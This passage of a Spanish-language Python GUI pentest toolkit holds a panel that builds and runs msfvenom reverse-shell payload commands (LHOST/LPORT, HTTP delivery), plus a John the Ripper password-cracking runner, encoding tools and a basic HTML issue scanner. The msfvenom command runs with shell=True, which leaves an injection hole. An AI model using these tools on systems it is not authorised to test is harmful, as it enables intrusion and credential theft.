        ctk.CTkLabel(form, text="Sistema Objetivo:", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=0, column=0, padx=12, pady=10, sticky="e")
        self.payload_os_menu = ctk.CTkOptionMenu(form, values=list(self.PAYLOADS_DB.keys()),
                                                 fg_color=c["BG_CARD"], button_color=c["ACCENT"], button_hover_color=c["ACCENT_HOVER"],
                                                 dropdown_fg_color=c["BG_CARD"], dropdown_text_color=c["TEXT_PRIMARY"],
                                                 text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.payload_os_menu.grid(row=0, column=1, padx=12, pady=10, sticky="w")

        ctk.CTkLabel(form, text="LHOST (Tu IP):", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=1, column=0, padx=12, pady=10, sticky="e")
        self.payload_lhost = ctk.CTkEntry(form, width=190,
                                          fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                          corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.payload_lhost.insert(0, self.app.obtener_ip_local())
        self.payload_lhost.grid(row=1, column=1, padx=12, pady=10, sticky="w")

        ctk.CTkLabel(form, text="LPORT:", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=2, column=0, padx=12, pady=10, sticky="e")
        self.payload_lport = ctk.CTkEntry(form, width=190,
                                          fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                          corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.payload_lport.insert(0, "4444")
        self.payload_lport.grid(row=2, column=1, padx=12, pady=10, sticky="w")

        ctk.CTkLabel(form, text="Nombre de salida:", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=3, column=0, padx=12, pady=10, sticky="e")
        self.payload_filename = ctk.CTkEntry(form, width=190,
                                             fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                             corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.payload_filename.insert(0, "shell")
        self.payload_filename.grid(row=3, column=1, padx=12, pady=10, sticky="w")

        self.btn_gen_payload = ctk.CTkButton(self, text="Generar Payload", fg_color=c["ACCENT"], hover_color=c["ACCENT_HOVER"],
                                             corner_radius=12, font=UI_FONT_BOLD, command=self.generar_payload, height=44)
        self.btn_gen_payload.pack(fill="x", padx=14, pady=14)

        self.payload_output = ctk.CTkTextbox(self, height=260, font=MONO_FONT,
                                             fg_color=c["BG_CARD"], text_color=c["TEXT_PRIMARY"])
        self.payload_output.pack(fill="both", expand=True, padx=14, pady=(0, 14))

    def generar_payload(self):
        seleccion = self.payload_os_menu.get()
        lhost = self.payload_lhost.get()
        lport = self.payload_lport.get()
        nombre_base = self.payload_filename.get()
        if not lhost or not lport or not nombre_base:
            self.payload_output.delete("1.0", "end")
            self.payload_output.insert("end", "[!] Falta IP, Puerto o Nombre.")
            return
        datos = self.PAYLOADS_DB[seleccion]
        payload_code = datos["p"]
        file_format = datos["f"]
        extension = datos["ext"]
        full_filename = f"{nombre_base}.{extension}"
        cmd = f"msfvenom -p {payload_code} LHOST={lhost} LPORT={lport} -f {file_format} -o {full_filename}"
        self.payload_output.delete("1.0", "end")
        sistema = platform.system()
        if sistema == "Windows":
            self.payload_output.insert("end", "[*] Estás en Windows. Copia y pega en tu Kali:\n\n")
            self.payload_output.insert("end", cmd)
        else:
            self.payload_output.insert("end", f"[*] Generando {full_filename}...\n[*] Ejecutando: {cmd}\n\n")

            def run_msf():
                try:
                    process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if process.returncode == 0:
                        self.after(0, lambda: self.log_payload_success(full_filename))
                    else:
                        self.after(0, lambda: self.log_payload_error(process.stderr))
                except Exception as e:
                    self.after(0, lambda: self.log_payload_error(str(e)))

            threading.Thread(target=run_msf, daemon=True).start()

    def log_payload_success(self, filename):
        self.payload_output.insert("end", f"[+] Éxito: {filename} creado en {os.getcwd()}\n")
        self.payload_output.insert("end", "[*] Usa el servidor HTTP para entregarlo.\n")

    def log_payload_error(self, err):
        self.payload_output.insert("end", f"[!] Error: {err}\n¿msfvenom está en el PATH?")


# ---------- Panel Cripto / Cracking ---------- #
class CryptoPanel(ctk.CTkFrame):
    def __init__(self, app: CyberNatuApp):
        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
        self.app = app
        self.hash_file = None
        self.wordlist = None
        self.build()

    def build(self):
        c = self.app.c
        header = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
        header.pack(fill="x", pady=8)
        ctk.CTkLabel(header, text="Cripto & Cracking", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)
        ctk.CTkLabel(header, text="Codifica/decodifica y prueba hashes con John", text_color=c["TEXT_MUTED"], font=UI_FONT).pack(side="left", padx=8, pady=14)

        encode_card = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        encode_card.pack(fill="x", pady=8, padx=8)
        ctk.CTkLabel(encode_card, text="Codificar / Hash", font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).grid(row=0, column=0, padx=12, pady=10, sticky="w")

        self.input_text = ctk.CTkTextbox(encode_card, height=120, width=380, fg_color=c["BG_CARD"], text_color=c["TEXT_PRIMARY"], font=MONO_FONT, corner_radius=10)
        self.input_text.grid(row=1, column=0, columnspan=2, padx=12, pady=6, sticky="we")

        button_col = ctk.CTkFrame(encode_card, fg_color="transparent")
        button_col.grid(row=1, column=2, padx=12, pady=6, sticky="n")

        ctk.CTkButton(button_col, text="Base64 Encode", fg_color=c["ACCENT"], hover_color=c["ACCENT_HOVER"],
                      corner_radius=10, font=UI_FONT_BOLD, command=self.do_b64_encode).pack(fill="x", pady=3)
        ctk.CTkButton(button_col, text="Base64 Decode", fg_color=c["ACCENT_SECONDARY"], hover_color="#3b82f6",
                      corner_radius=10, font=UI_FONT_BOLD, command=self.do_b64_decode).pack(fill="x", pady=3)
        ctk.CTkButton(button_col, text="SHA-256", fg_color="#475569", hover_color="#334155",
                      corner_radius=10, font=UI_FONT_BOLD, command=lambda: self.do_hash("sha256")).pack(fill="x", pady=3)
        ctk.CTkButton(button_col, text="MD5", fg_color="#64748b", hover_color="#475569",
                      corner_radius=10, font=UI_FONT_BOLD, command=lambda: self.do_hash("md5")).pack(fill="x", pady=3)
        ctk.CTkButton(button_col, text="Texto → Binario", fg_color="#374151", hover_color="#4b5563",
                      corner_radius=10, font=UI_FONT_BOLD, command=self.do_to_bin).pack(fill="x", pady=3)
        ctk.CTkButton(button_col, text="Binario → Texto", fg_color="#374151", hover_color="#4b5563",
                      corner_radius=10, font=UI_FONT_BOLD, command=self.do_bin_to_text).pack(fill="x", pady=3)
        ctk.CTkButton(button_col, text="Texto → Hex", fg_color="#374151", hover_color="#4b5563",
                      corner_radius=10, font=UI_FONT_BOLD, command=self.do_to_hex).pack(fill="x", pady=3)
        ctk.CTkButton(button_col, text="Hex → Texto", fg_color="#374151", hover_color="#4b5563",
                      corner_radius=10, font=UI_FONT_BOLD, command=self.do_hex_to_text).pack(fill="x", pady=3)

        ctk.CTkLabel(encode_card, text="Salida", font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).grid(row=2, column=0, padx=12, pady=(8, 2), sticky="w")
        self.output_text = ctk.CTkTextbox(encode_card, height=120, width=380, fg_color=c["BG_CARD"], text_color=c["TEXT_PRIMARY"], font=MONO_FONT, corner_radius=10)
        self.output_text.grid(row=3, column=0, columnspan=3, padx=12, pady=(0, 10), sticky="we")

        john_card = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        john_card.pack(fill="x", pady=10, padx=8)
        ctk.CTkLabel(john_card, text="Cracking con John the Ripper", font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).grid(row=0, column=0, padx=12, pady=10, sticky="w")

        ctk.CTkButton(john_card, text="Seleccionar hashes", fg_color=c["ACCENT"], hover_color=c["ACCENT_HOVER"],
                      corner_radius=10, font=UI_FONT_BOLD, command=self.pick_hash_file).grid(row=1, column=0, padx=12, pady=6, sticky="w")
        self.lbl_hash = ctk.CTkLabel(john_card, text="Ningún archivo", text_color=c["TEXT_MUTED"], font=UI_FONT)
        self.lbl_hash.grid(row=1, column=1, padx=8, pady=6, sticky="w")

        ctk.CTkButton(john_card, text="Seleccionar wordlist", fg_color=c["BG_CARD"], hover_color=c["ACCENT_HOVER"],
                      corner_radius=10, font=UI_FONT_BOLD, command=self.pick_wordlist).grid(row=2, column=0, padx=12, pady=6, sticky="w")
        self.lbl_wordlist = ctk.CTkLabel(john_card, text="Ninguna wordlist", text_color=c["TEXT_MUTED"], font=UI_FONT)
        self.lbl_wordlist.grid(row=2, column=1, padx=8, pady=6, sticky="w")

        ctk.CTkLabel(john_card, text="Formato (raw-md5 / zip ...)", text_color=c["TEXT_PRIMARY"], font=UI_FONT).grid(row=3, column=0, padx=12, pady=6, sticky="w")
        self.john_format = ctk.CTkEntry(john_card, width=200, placeholder_text="raw-md5 / zip / etc",
                                        fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                        corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.john_format.grid(row=3, column=1, padx=8, pady=6, sticky="w")

        self.btn_john = ctk.CTkButton(john_card, text="Ejecutar John", fg_color=c["TEXT_WARNING"], hover_color="#d97706",
                                      corner_radius=12, font=UI_FONT_BOLD, text_color="#0b0b0b",
                                      command=self.run_john)
        self.btn_john.grid(row=4, column=0, padx=12, pady=10, sticky="w")

        self.john_output = ctk.CTkTextbox(john_card, height=180, fg_color=c["BG_CARD"], text_color=c["TEXT_PRIMARY"], font=MONO_FONT)
        self.john_output.grid(row=5, column=0, columnspan=3, padx=12, pady=(0, 12), sticky="we")

    def do_b64_encode(self):
        data = self.input_text.get("1.0", "end").strip()
        out = base64.b64encode(data.encode()).decode()
        self._set_output(out)

    def do_b64_decode(self):
        data = self.input_text.get("1.0", "end").strip()
        try:
            out = base64.b64decode(data).decode(errors="ignore")
            self._set_output(out)
        except binascii.Error:
            self._set_output("[!] Base64 inválido")

    def do_hash(self, algo):
        data = self.input_text.get("1.0", "end").strip().encode()
        h = hashlib.new(algo)
        h.update(data)
        self._set_output(h.hexdigest())

    def do_to_bin(self):
        data = self.input_text.get("1.0", "end").strip()
        out = " ".join(format(ord(c), "08b") for c in data)
        self._set_output(out)

    def do_to_hex(self):
        data = self.input_text.get("1.0", "end").strip()
        out = data.encode().hex()
        self._set_output(out)

    def do_bin_to_text(self):
        data = self.input_text.get("1.0", "end").strip().split()
        try:
            chars = [chr(int(b, 2)) for b in data]
            self._set_output("".join(chars))
        except Exception:
            self._set_output("[!] Binario inválido (usa 8 bits separados por espacio)")

    def do_hex_to_text(self):
        data = self.input_text.get("1.0", "end").strip().replace(" ", "")
        try:
            out = bytes.fromhex(data).decode(errors="ignore")
            self._set_output(out)
        except Exception:
            self._set_output("[!] Hex inválido")

    def _set_output(self, text):
        self.output_text.configure(state="normal")
        self.output_text.delete("1.0", "end")
        self.output_text.insert("end", text)
        self.output_text.configure(state="disabled")

    def pick_hash_file(self):
        from tkinter import filedialog
        path = filedialog.askopenfilename(title="Selecciona archivo de hashes")
        if path:
            self.hash_file = path
            self.lbl_hash.configure(text=os.path.basename(path))

    def pick_wordlist(self):
        from tkinter import filedialog
        path = filedialog.askopenfilename(title="Selecciona wordlist")
        if path:
            self.wordlist = path
            self.lbl_wordlist.configure(text=os.path.basename(path))

    def run_john(self):
        self.john_output.delete("1.0", "end")
        if not self.hash_file or not self.wordlist:
            self.john_output.insert("end", "[!] Falta hashfile o wordlist.\n")
            return
        john_bin = shutil.which("john")
        if not john_bin:
            self.john_output.insert("end", "[!] John the Ripper no está en PATH.\n")
            return
        cmd = [john_bin, f"--wordlist={self.wordlist}"]
        fmt = self.john_format.get().strip()
        if fmt:
            cmd.append(f"--format={fmt}")
        cmd.append(self.hash_file)
        self.john_output.insert("end", f"[*] Ejecutando: {' '.join(cmd)}\n")
        threading.Thread(target=self._run_john_proc, args=(cmd,), daemon=True).start()

    def _run_john_proc(self, cmd):
        try:
            res = subprocess.run(cmd, capture_output=True, text=True)
            out = res.stdout + ("\n" + res.stderr if res.stderr else "")
            self.after(0, lambda: self._append_john(out))
        except Exception as e:
            self.after(0, lambda: self._append_john(f"[!] Error: {e}\n"))

    def _append_john(self, text):
        self.john_output.insert("end", text)
        self.john_output.see("end")


# ---------- Panel Logs ---------- #
class LogsPanel(ctk.CTkFrame):
    def __init__(self, app: CyberNatuApp):
        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
        self.app = app
        self.build()
        self._is_clean = False

    def build(self):
        c = self.app.c
        header = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
        header.pack(fill="x", pady=8)
        ctk.CTkLabel(header, text="Logs", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)
        ctk.CTkLabel(header, text="Scrollable y copiables", text_color=c["TEXT_MUTED"], font=UI_FONT).pack(side="left", padx=8, pady=14)

        self.log_box = ctk.CTkTextbox(self, height=620, font=MONO_FONT, fg_color=c["BG_CARD"], text_color=c["TEXT_PRIMARY"])
        self.log_box.pack(fill="both", expand=True, padx=12, pady=12)
        self.log_box.insert("end", "[+] Aquí puedes pegar y revisar logs.\n")

    def append(self, text: str):
        import datetime
        if not self._is_clean:
            self.log_box.delete("1.0", "end")
            self._is_clean = True
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        self.log_box.insert("end", f"[{ts}] {text}")
        self.log_box.see("end")


# ---------- Panel Visor HTML / Archivos ---------- #
class ViewerPanel(ctk.CTkFrame):
    def __init__(self, app: CyberNatuApp):
        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
        self.app = app
        self.build()

    def build(self):
        c = self.app.c
        header = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
        header.pack(fill="x", pady=8)
        ctk.CTkLabel(header, text="Visor HTML / Archivos", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)
        ctk.CTkLabel(header, text="Carga URL o archivo local y revisa contenido", text_color=c["TEXT_MUTED"], font=UI_FONT).pack(side="left", padx=8, pady=14)

        form = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        form.pack(fill="x", pady=10, padx=6)
        self.url_entry = ctk.CTkEntry(form, width=420, placeholder_text="https://ejemplo.com",
                                      fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                      corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.url_entry.grid(row=0, column=0, padx=10, pady=10, sticky="w")
        ctk.CTkButton(form, text="Abrir URL", fg_color=c["ACCENT"], hover_color=c["ACCENT_HOVER"],
                      corner_radius=10, font=UI_FONT_BOLD, command=self.load_url).grid(row=0, column=1, padx=8, pady=10)
        ctk.CTkButton(form, text="📂 Archivo", fg_color=c["BG_CARD"], hover_color=c["ACCENT_HOVER"],
                      corner_radius=10, font=UI_FONT_BOLD, command=self.load_file).grid(row=0, column=2, padx=8, pady=10)

        # Tabs estilo mini VSCode
        tabs_shell = ctk.CTkFrame(self, fg_color="#1e1e1e", corner_radius=12, border_width=1, border_color="#2a2a2a")
        tabs_shell.pack(fill="both", expand=True, padx=10, pady=10)

        self.tabs = ctk.CTkTabview(tabs_shell, fg_color="#1e1e1e")
        self.tabs.pack(fill="both", expand=True, padx=6, pady=6)
        try:
            self.tabs._segmented_button.configure(
                fg_color="#252526",
                selected_color="#1f6feb",
                selected_hover_color="#1f6feb",
                unselected_color="#2d2d2d",
                unselected_hover_color="#3a3a3a",
                text_color="#d4d4d4",
                font=UI_FONT_BOLD,
                height=32,
                corner_radius=8,
                border_width=1,
                border_color="#2a2a2a",
            )
        except Exception:
            pass

        self.analysis = ctk.CTkTextbox(self, height=160, font=MONO_FONT, fg_color=c["BG_CARD"], text_color=c["TEXT_MUTED"])
        self.analysis.pack(fill="x", padx=10, pady=(0, 12))
        self.analysis.insert("end", "[*] Aquí verás un resumen simple del HTML/archivo.\n")
        self.analysis.configure(state="disabled")

    def load_url(self):
        url = self.url_entry.get().strip()
        if not url:
            return
        try:
            resp = requests.get(url, timeout=6)
            content = resp.text
            self.add_tab(url, content)
            self.load_linked_files(url, content)
            self.set_analysis(content)
        except Exception as e:
            self.add_tab("error", f"[!] Error al cargar URL: {e}")

    def load_file(self):
        from tkinter import filedialog
        path = filedialog.askopenfilename(title="Selecciona archivo")
        if not path:
            return
        try:
            with open(path, "r", errors="ignore") as f:
                content = f.read()
            self.add_tab(os.path.basename(path), content)
            self.set_analysis(content)
        except Exception as e:
            self.add_tab("error", f"[!] Error al leer archivo: {e}")

    def add_tab(self, title, content):
        c = self.app.c
        tab_title = title if len(title) < 20 else title[:17] + "..."
        tab = self.tabs.add(tab_title)
        # estilo VSCode: fondo oscuro y numeración de líneas
        lines = content.splitlines()
        numbered = "\n".join(f"{i:>4} | {line}" for i, line in enumerate(lines, 1))
        txt = ctk.CTkTextbox(tab, font=MONO_FONT, fg_color="#1e1e1e", text_color="#d4d4d4")
        txt.pack(fill="both", expand=True, padx=4, pady=4)
        txt.insert("end", numbered)
        # Colores estilo VSCode (resaltado básico)
        try:
            txt.tag_config("ln", foreground="#6b7280")
            txt.tag_config("tag", foreground="#569cd6")
            txt.tag_config("attr", foreground="#9cdcfe")
            txt.tag_config("string", foreground="#ce9178")
            txt.tag_config("comment", foreground="#6a9955")
            txt.tag_config("punct", foreground="#d4d4d4")

            import re
            for i, line in enumerate(lines, 1):
                # índice de inicio de línea
                base = f"{i}.0"
                # número de línea (primeros 6 chars: "   1 |")
                txt.tag_add("ln", base, f"{i}.6")

                # offset donde empieza el contenido real
                content_start = 6
                raw = line

                # comentarios HTML
                for m in re.finditer(r"<!--.*?-->", raw):
                    s = content_start + m.start()
                    e = content_start + m.end()
                    txt.tag_add("comment", f"{i}.{s}", f"{i}.{e}")

                # strings
                for m in re.finditer(r"\"[^\"]*\"|'[^']*'", raw):
                    s = content_start + m.start()
                    e = content_start + m.end()
                    txt.tag_add("string", f"{i}.{s}", f"{i}.{e}")

                # tags
                for m in re.finditer(r"</?[\w:-]+", raw):
                    s = content_start + m.start()
                    e = content_start + m.end()
                    txt.tag_add("tag", f"{i}.{s}", f"{i}.{e}")

                # attributes (nombre=)
                for m in re.finditer(r"\b[\w:-]+(?=\=)", raw):
                    s = content_start + m.start()
                    e = content_start + m.end()
                    txt.tag_add("attr", f"{i}.{s}", f"{i}.{e}")
        except Exception:
            pass

        txt.configure(state="disabled")

    def load_linked_files(self, base_url, html):
        # Extrae href/src y abre archivos de texto en nuevas pestañas
        links = set(re.findall(r'(?:href|src)=["\\\']([^"\\\']+)["\\\']', html, flags=re.IGNORECASE))
        if not links:
            return
        count = 0
        for link in links:
            if count >= 8:
                break
            if link.startswith("mailto:") or link.startswith("javascript:"):
                continue
            full = urllib.parse.urljoin(base_url, link)
            try:
                r = requests.get(full, timeout=6)
                ctype = r.headers.get("Content-Type", "")
                if any(t in ctype for t in ["text", "javascript", "json", "css"]):
                    name = os.path.basename(urllib.parse.urlparse(full).path) or "resource"
                    self.add_tab(name, r.text)
                    count += 1
            except Exception:
                continue

    def set_analysis(self, text):
        issues = []
        links = re.findall(r'(?:href|src)=["\\\']([^"\\\']+)["\\\']', text, flags=re.IGNORECASE)
        if "<form" in text:
            issues.append("- Formularios detectados: revisa validación y CSRF.")
        if "password" in text.lower():
            issues.append("- Campo 'password' encontrado: verifica transmisión segura (HTTPS).")
        if "eval(" in text or "onclick" in text.lower():
            issues.append("- Posibles JS inline: revisa XSS.")
        if "admin" in text.lower():
            issues.append("- Referencia a 'admin': podría revelar rutas sensibles.")
        summary = "Resumen rápido:\n"
        summary += f"- Archivos/enlaces detectados: {len(set(links))}\n"
        summary += ("\n".join(issues) if issues else "- No se detectaron patrones obvios.")
        self.analysis.configure(state="normal")
        self.analysis.delete("1.0", "end")
        self.analysis.insert("end", summary)
        self.analysis.configure(state="disabled")


def run_app():
    app = CyberNatuApp()
    app.mainloop()
